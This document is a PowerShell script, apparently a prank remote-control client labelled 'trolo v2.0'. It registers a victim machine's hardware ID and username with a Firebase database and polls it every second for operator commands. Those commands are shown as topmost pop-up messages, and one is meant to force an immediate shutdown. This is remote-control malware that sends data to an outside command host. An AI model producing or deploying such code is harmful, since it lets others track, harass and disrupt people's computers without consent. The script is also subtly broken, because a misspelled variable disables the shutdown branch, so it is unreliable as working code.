$hwid = (Get-WmiObject Win32_ComputerSystemProduct).UUID
$username = $env:USERNAME
Add-Type -AssemblyName System.Windows.Forms
while ($true) {
try {
$response = Invoke-RestMethod -Uri "https://trolo-1252e-default-rtdb.firebaseio.com/main.json" -Method Get
if (-not $response) {
Write-Output "Response is null or empty."
} elseif (-not ($response.PSObject.Properties.Name -contains $hwid)) {
Write-Output "Response does not contain HWID key: $hwid"
$body = @{
$hwid = @{
username = $username
message = ""
}
} | ConvertTo-Json -Depth 3
Invoke-RestMethod -Uri "https://trolo-1252e-default-rtdb.firebaseio.com/main.json" -Method Patch -Body $body
} elseif (-not $response.$hwid.message -or $response.$hwid.message -eq "") {
} else {
if ($respone.$hwid.message -eq "shutdownAll") {
shutdown.exe /s /t 0 /f
} else {
$topForm = New-Object System.Windows.Forms.Form
$topForm.TopMost = $true
$topForm.ShowInTaskbar = $false
$topForm.WindowState = 'Minimized'

[System.Windows.Forms.MessageBox]::Show(
    $topForm,
    $response.$hwid.message,
    "trolo v2.0",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Information
)
$topForm.Dispose()
}
$body = @{
username = $username
message = ""
} | ConvertTo-Json -Depth 3
$url = "https://trolo-1252e-default-rtdb.firebaseio.com/main/${hwid}.json"
Write-Output $url
Invoke-RestMethod -Uri $url -Method Patch -Body $body -ContentType "application/json"
}
} catch {
Write-Output "Exception caught: $_"
}
$body = @{
username = $username
ping = ((Get-Date).ToString("o"))
message = ""
} | ConvertTo-Json -Depth 3
Invoke-RestMethod -Uri "https://trolo-1252e-default-rtdb.firebaseio.com/main/$hwid.json" -Method Patch -Body $body -ContentType "application/json"
Start-Sleep -Seconds 1
}

